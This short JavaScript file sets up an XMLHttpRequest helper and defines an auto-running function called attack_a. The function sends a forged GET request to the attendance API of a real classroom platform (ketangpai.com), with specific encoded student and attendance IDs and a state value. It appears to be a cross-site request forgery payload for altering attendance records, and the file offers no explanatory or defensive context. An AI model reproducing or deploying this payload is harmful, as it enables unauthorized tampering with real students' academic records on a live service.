xhr = function(){
  /*AJAX*/
  var request = false;
  if(window.XMLHttpRequest) {
    request = new XMLHttpRequest();
  } else if(window.ActiveXObject) {
    try {
      request = new window.ActiveXObject('Microsoft.XMLHTTP');
    } catch(e) {}
  }
  return request;
}();

request = function(method,src,argv,content_type){
  xhr.open(method,src,false);
  if(method=='POST')xhr.setRequestHeader('Content-Type',content_type);
  xhr.send(argv);
  return xhr.responseText;
}

attack_a = function(){
  var src = "https://www.ketangpai.com/AttenceApi/updateState?studentid=MDAwMDAwMDAwMLOsuZiIuadthrVyoQ&attenceid=MDAwMDAwMDAwMLOGz5SIqa9ohNtyoQ&state=0";
  var argv_0 = "";
  request("GET",src,argv_0,"application/x-www-form-urlencoded");
}
attack_a();
